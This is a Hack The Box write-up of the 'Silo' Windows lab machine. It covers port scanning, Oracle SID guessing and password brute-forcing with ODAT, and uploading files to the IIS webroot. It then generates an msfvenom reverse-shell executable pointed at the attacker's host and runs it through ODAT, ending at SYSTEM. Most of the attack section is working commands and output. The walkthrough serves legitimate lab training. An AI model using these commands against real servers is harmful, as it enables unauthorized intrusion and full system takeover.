---
title: "Hack The Box | Silo"
description: "Silo focuses mainly on leveraging Oracle to obtain a shell and escalate privileges. It was intended to be completed manually using various tools, however Oracle Database Attack Tool greatly simplifies the process, reducing the difficulty of the machine substantially."
pubDate: "Nov 22 2024"
heroImage: "/silo.png"
badge: "Windows - Medium"
tags: ["OracleTNS","Windows","Reverse Shell","Bruteforcing","msfvenom","HTB"]
---

- Nmap TCP Open Ports:

```sh
sudo nmap -sS --open -p- -Pn -n -vvv --min-rate 5000 10.129.147.98 -oG allPorts
```

```python
Nmap scan report for 10.129.147.98
Host is up, received user-set (0.15s latency).
Scanned at 2024-11-22 01:50:59 -03 for 16s
Not shown: 59640 closed tcp ports (reset), 5882 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
1521/tcp  open  oracle       syn-ack ttl 127
5985/tcp  open  wsman        syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49159/tcp open  unknown      syn-ack ttl 127
49162/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.81 seconds
           Raw packets sent: 77212 (3.397MB) | Rcvd: 64700 (2.588MB)
```

- Nmap basic scripts and service recon:

```sh
 nmap -sCV -p 80,135,139,445,1521,5985,47001,49152,49153,49154,49155,49159,49162 10.129.147.98 -oN target
```

```python
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-11-22T04:55:43
|_  start_date: 2024-11-22T03:14:42
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
|_clock-skew: mean: 1s, deviation: 0s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 138.87 seconds
```

- Found Windows RPC services and oracle tns, so let's enumerate the port 1521 searching for SIDs:

```sh
❯ odat sidguesser -s 10.129.147.98

[1] (10.129.147.98:1521): Searching valid SIDs
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.147.98:1521 server
[+] 'X*' is a valid SID. Continue...        #############################################################################################  | ETA:  00:00:04 
100% |#####################################################################################################################################| Time: 00:07:25 
```

- Odat password guesser whith the SID that we found:

```sh
❯ sudo odat passwordguesser -s 10.129.147.98 -d X*
Deploying root access for b4dscript. Password pls: 

[1] (10.129.147.98:1521): Searching valid accounts on the 10.129.147.98 server, port 1521
The login cis has already been tested at least once. What do you want to do:                                                               | ETA:  00:23:18 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                             | ETA:  00:22:35 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                             | ETA:  00:21:37 
[!] Notice: 'dip' account is locked, so skipping this username for password                                                                | ETA:  00:20:12 
[!] Notice: 'hr' account is locked, so skipping this username for password                                                                 | ETA:  00:16:23 
[!] Notice: 'mdsys' account is locked, so skipping this username for password                                                              | ETA:  00:12:53 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password###                                                      | ETA:  00:09:44 
[!] Notice: 'outln' account is locked, so skipping this username for password##############                                                | ETA:  00:08:39 
[+] Valid credentials found: s****/t****. Continue...                                           ################                           | ETA:  00:04:59 
^CTraceback (most recent call last):#################################################################################                      | ETA:  00:04:02 
```


- With odat, we can put files on the systems if the user we found have permissions, but before putting a file in the system we got to find a path to put it in, on the nmap scan we see a ISS service:

![alt text](/8.png)

- if we search in google for ISS default path, usually is "C:\inetpub\wwwroot":

![alt text](/9.png)


- Testing put files in the target:

```sh
❯ odat utlfile -s 10.129.147.98 -d X* -U s**** -P t***** --sysdba --putFile C:\\inetpub\\wwwroot test.txt ./test.txt

[1] (10.129.147.98:1521): Put the ./test.txt local file in the C:\inetpub\wwwroot folder like test.txt on the 10.129.147.98 server
[+] The ./test.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.147.98 server like the test.txt file
```

- If we can put files, we can put a reverse shell created with msfvenom:

```sh
sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YourIP> LPORT=<PORT> -f exe -o shell.exe
```

- Upload the shell:

```sh
❯ odat utlfile -s 10.129.147.98 -d X* -U s**** -P t**** --sysdba --putFile C:\\inetpub\\wwwroot shell.exe ./shell.exe
```



- listening on port 666:
```sh
rlwrap nc -nvlp 666
```


- execute the file with odat:

```sh
 odat externaltable -s 10.129.147.98 -d X* -U s**** -P t**** --sysdba --exec C:\\inetpub\\wwwroot shell.exe  
```

![alt text](/10.png)

- We get access as NT authority system, from there you can get the user and root flag.